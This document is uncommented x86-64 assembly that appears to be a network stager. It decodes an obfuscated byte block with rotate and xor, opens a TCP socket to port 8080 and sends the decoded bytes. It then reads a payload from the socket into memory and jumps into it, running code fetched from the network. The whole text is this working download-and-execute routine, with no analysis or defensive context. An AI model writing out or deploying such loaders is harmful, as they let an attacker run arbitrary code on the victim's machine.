	.section .text

	.globl _start

_start:
	movq	$0x401078,%r8
	jmp	.L0
.L1:
	movb	(%r8),%r9b
	rolb	$4,%r9b
	xorb	$0x42,%r9b
	movb	%r9b,(%r8)
	addq	$1,%r8
.L0:
	cmpq	$0x4010a0,%r8
	jl	.L1
	movl	$0x29,%eax
	movl	$0x2,%edi
	movl	$0x1,%esi
	xorl	%edx,%edx
	syscall
	pushq	%rax
	xorq	%rax,%rax
	pushq	%rax
	movq	$0x901f0002,%rax
	pushq	%rax
	movl	$0x2a,%eax
	movl	0x10(%rsp),%edi
	leaq	(%rsp),%rsi
	movl	$0x10,%edx
	syscall
	movl	$1,%eax
	movl	0x10(%rsp),%edi
	movq	$0x401078,%rsi
	movl	$0x28,%edx
	syscall
	movl	$0x7d,0xfffffffffffffff0(%rsp)
	movq	$0x401a00,0xfffffffffffffff8(%rsp)
.L3:
	xorl	%eax,%eax
	movl	0x10(%rsp),%edi
	movq	0xfffffffffffffff8(%rsp),%rsi
	movl	0xfffffffffffffff0(%rsp),%edx
	syscall
	test	%eax,%eax
	jle 	.L2
	addl	%eax,0xfffffffffffffff8(%rsp)
	subl	%eax,0xfffffffffffffff0(%rsp)
	jg	.L3
.L2:
	movl	$0x3,%eax
	movl	0x10(%rsp),%edi
	syscall
	movl	$0x401a4c,%eax
	call	*%rax
